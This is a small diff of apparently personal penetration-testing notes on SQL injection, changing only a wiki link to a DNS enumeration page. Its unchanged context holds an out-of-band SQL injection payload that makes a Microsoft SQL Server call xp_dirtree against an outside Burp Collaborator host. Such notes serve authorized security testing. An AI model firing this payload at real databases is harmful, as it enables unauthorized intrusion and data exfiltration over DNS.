@@ -1,6 +1,6 @@
 [[SQLi]]
 By DNS lookup:
-[[DNS]]
+[[Pentest/Enumeration/DNS]]
 ```sql
 '; exec master..xp_dirtree '//0efdymgw1o5w9inae8mg4dfrgim9ay.burpcollaborator.net/a'--
 ```
